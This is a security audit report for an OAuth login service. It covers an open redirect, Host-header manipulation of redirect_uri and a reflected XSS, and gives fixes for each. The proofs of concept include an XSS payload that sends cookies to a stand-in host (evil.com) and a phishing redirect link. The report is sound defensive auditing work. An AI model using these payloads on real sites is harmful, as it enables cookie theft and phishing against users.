## ASVS-10.4.1: Redirect URI Allowlist Validation

### Findings for 10.4.1

### [HIGH]

**Finding ID:** ASVS-1041-HIGH-001

**Title:** Open Redirect via Unvalidated `return_to` Parameter in OAuth Flow

**File:** `webapp/packages/api/user-service/routes_auth.py`, lines in `login_callback` (approximately line 130-140)

**Vulnerable code:**

```python
    # Resolve return_to against FRONTEND_URL when relative. The cookie
    # stores a frontend path (e.g. "/login"); without prefixing, the
    # browser would resolve it against the API host (port 8000) and 404.
    raw_target = return_to or "/"
    if raw_target.startswith(("http://", "https://")):
        redirect_url = raw_target  # ← No validation against allowlist!
    else:
        frontend_base = os.getenv("FRONTEND_URL", "http://localhost:3000").rstrip("/")
        if not raw_target.startswith("/"):
            raw_target = "/" + raw_target
        redirect_url = frontend_base + raw_target
    resp = RedirectResponse(url=redirect_url, status_code=302)
```

**Data flow:** 
User-controlled query param `return_to` → `login_redirect` → stored in cookie `gofannon_return_to` → `login_callback` reads cookie → absolute URL used directly as redirect target → no allowlist validation

**Proof of concept:**
```
1. Attacker crafts link: https://app.example.com/auth/login/github?return_to=https://evil.com/phish
2. Victim clicks link, sees legitimate GitHub OAuth consent screen
3. Victim authenticates with GitHub (sees app.example.com as the OAuth client)
4. After successful auth, victim is redirected to https://evil.com/phish
5. evil.com shows "Session expired, please re-enter credentials" phishing page
```

**Impact:** 
- Enables phishing attacks that leverage the application's legitimate OAuth flow to build trust
- User sees a legitimate consent screen from their OAuth provider, then lands on an attacker-controlled page
- The session cookie IS set on the legitimate domain before redirect (session not stolen), but the user's trust is exploited for credential phishing
- Severity amplified because the redirect happens immediately after authentication — users have high trust at that moment

**Remediation:**
```python
import urllib.parse

ALLOWED_REDIRECT_ORIGINS = None  # Populated from config

def _validate_return_to(return_to: Optional[str], request: Request) -> str:
    """Validate return_to against allowed origins."""
    if not return_to or return_to == "/":
        frontend_base = os.getenv("FRONTEND_URL", "http://localhost:3000").rstrip("/")
        return frontend_base + "/"
    
    # Only allow relative paths or paths matching FRONTEND_URL origin
    frontend_base = os.getenv("FRONTEND_URL", "http://localhost:3000").rstrip("/")
    frontend_origin = urllib.parse.urlparse(frontend_base)
    
    if return_to.startswith(("http://", "https://")):
        parsed = urllib.parse.urlparse(return_to)
        if parsed.netloc != frontend_origin.netloc:
            # Reject external redirects
            return frontend_base + "/"
        return return_to
    
    # Relative path — prefix with frontend base
    if not return_to.startswith("/"):
        return_to = "/" + return_to
    return frontend_base + return_to
```

### [MEDIUM]

**Finding ID:** ASVS-1041-MED-001

**Title:** Redirect URI Dynamically Computed from Request Host Without Allowlist

**File:** `webapp/packages/api/user-service/routes_auth.py`, `_default_redirect_uri` function

**Vulnerable code:**

```python
def _default_redirect_uri(request: Request, provider_type: str) -> str:
    """Build the ``redirect_uri`` the provider should bounce back to."""
    base = str(request.base_url).rstrip("/")
    return f"{base}/auth/callback/{provider_type}"
```

**Data flow:** HTTP request `Host` header → `request.base_url` → redirect_uri sent to OAuth provider → if provider doesn't validate, code sent to attacker-controlled host

**Proof of concept:**
```http
GET /auth/login/asf HTTP/1.1
Host: evil.com

# If no reverse proxy filters Host, redirect_uri becomes:
# http://evil.com/auth/callback/asf
# ASF's non-standard OAuth flow (no client_id) may not validate redirect_uri
```

**Impact:** If the application is deployed without a properly configured reverse proxy that validates/overrides the Host header, AND the OAuth provider doesn't strictly validate redirect_uri (particularly relevant for ASF's non-standard flow), the authorization code could be directed to an attacker-controlled endpoint.

**Remediation:**
```python
def _default_redirect_uri(request: Request, provider_type: str) -> str:
    """Build redirect_uri from configured base, not request Host."""
    # Use a configured base URL rather than trusting the request
    base = os.getenv("APP_BASE_URL", str(request.base_url).rstrip("/"))
    return f"{base}/auth/callback/{provider_type}"
```

### [MEDIUM]

**Finding ID:** ASVS-1041-MED-002

**Title:** XSS in Dev-Stub Picker via Unescaped Query Parameters

**File:** `webapp/packages/api/user-service/routes_auth.py`, `dev_stub_picker` function

**Vulnerable code:**

```python
@router.get("/auth/dev-stub-picker", response_class=HTMLResponse)
async def dev_stub_picker(
    request: Request,
    state: str = Query(...),
    redirect_uri: str = Query(...),
    users: str = Query(...),
) -> HTMLResponse:
    user_list = [u for u in users.split(",") if u]
    links = "".join(
        f'<li><a href="/auth/callback/dev_stub?code={u}&state={state}">{u}</a></li>'
        for u in user_list
    )
    html = f"""<!doctype html>
<html>
  ...
    <ul>{links}</ul>
  ...
</html>"""
```

**Data flow:** User-controlled query params `state` and `users` → embedded directly in HTML without escaping → reflected XSS

**Proof of concept:**
```
GET /auth/dev-stub-picker?state="><script>document.location='https://evil.com/steal?c='+document.cookie</script><a+href="&redirect_uri=x&users=alice
```

**Impact:** Reflected XSS on the application domain. If dev_stub is enabled, an attacker can execute arbitrary JavaScript in the context of the application's origin. Despite `httponly` cookies, this enables DOM manipulation, phishing overlays, and keylogging on the login page. Severity limited by the dev_stub enablement requirement.

**Remediation:**
```python
import html as _html
from urllib.parse import quote

@router.get("/auth/dev-stub-picker", response_class=HTMLResponse)
async def dev_stub_picker(...):
    user_list = [u for u in users.split(",") if u]
    links = "".join(
        f'<li><a href="/auth/callback/dev_stub?code={quote(u)}&state={quote(state)}">'
        f'{_html.escape(u)}</a></li>'
        for u in user_list
    )
    ...
```

## Cross-cutting Architecture Observations

1. **OAuth Client vs. Authorization Server Scope:** This application functions as an OAuth client, not an authorization server. ASVS 10.4.x requirements primarily target authorization servers. The application correctly delegates code issuance, single-use enforcement, and lifetime management to external providers (Google, GitHub, Microsoft, ASF). The dev_stub provider is the only component that exhibits authorization-server-like behavior, and it explicitly violates multiple authorization server requirements by design.

2. **Defense-in-Depth Gap:** The application relies heavily on external OAuth providers for security properties (code single-use, lifetime, brute-force protection on credentials) but adds no application-layer defense for scenarios where those external controls might be insufficient or misconfigured. The CSRF state validation is the only application-layer control protecting the OAuth callback.

3. **Dev/Production Boundary Weakness:** The separation between development and production configurations relies on documentation and environment variable overrides rather than code-level enforcement. The dev_stub provider with its default accounts can be enabled in production with only a logged warning as consequence. This represents a systemic risk where a single configuration mistake (forgetting to set `AUTH_CONFIG_PATH`) grants unauthenticated access with site-admin privileges.

4. **Token Stashing Pattern:** Multiple providers attach `_access_token` as an ad-hoc attribute to the `UserInfo` dataclass. This pattern works but means access tokens exist in memory attached to objects that may be serialized, logged, or passed through middleware. The tokens' lifecycle is tied to the request/response cycle with no explicit cleanup.

5. **Soft-Fail Posture:** The system consistently soft-fails (returns empty memberships) when external services are unavailable (LDAP, GitHub API, Google Admin SDK). While this prevents outages, it means a sustained external service disruption silently degrades security posture (users lose workspace access rather than being explicitly denied).

## Cross-cutting Recommendations

### Immediate (Critical/High severity, implement before next release)

1. **Add rate limiting to authentication endpoints** — Deploy a rate-limiting middleware (e.g., SlowAPI, Redis-backed limiter) on `/auth/login/*`, `/auth/callback/*`, and `/auth/dev-stub-picker`. Suggested limits: 10 login initiations/minute/IP, 5 callback attempts/minute/IP.

2. **Fix open redirect in `return_to`** — Validate `return_to` against a configured allowlist of origins (at minimum, the `FRONTEND_URL` origin). Reject absolute URLs pointing to external domains.

3. **Fix XSS in dev_stub_picker** — HTML-escape `state` and `users` values before embedding in HTML output. Apply URL-encoding in `href` attributes.

### Short-term (Medium severity, implement within 30 days)

4. **Hard-block dev_stub in production** — Change the session service warning to a hard failure: if `APP_ENV` is not in `{local, dev, test}`, refuse to initialize the dev_stub provider. This prevents accidental deployment of default accounts.

5. **Use configured base URL for redirect_uri** — Replace `request.base_url` in `_default_redirect_uri` with a configured environment variable (`APP_BASE_URL`) to prevent Host header manipulation from influencing the OAuth redirect_uri.

6. **Add authentication attempt auditing** — Log all login attempts (successful and failed) with IP, timestamp, provider type, and outcome. This enables detection of credential stuffing and supports incident response.

### Long-term (Architectural improvements)

7. **Implement PKCE (Proof Key for Code Exchange)** — Add PKCE to the OAuth flows for Google, GitHub, and Microsoft providers. This provides additional protection against authorization code interception, particularly relevant for the ASF provider's non-standard flow.

8. **Formalize token lifecycle** — Replace the ad-hoc `_access_token` attribute stashing with an explicit token context that is cleared after the workspace membership query completes, reducing the window where access tokens exist in memory.

9. **Consider WAF/CDN-level protections** — Document the requirement for upstream rate limiting and bot detection (e.g., Cloudflare, AWS WAF) as part of the deployment security requirements, given that application-layer rate limiting alone may not suffice against distributed attacks.
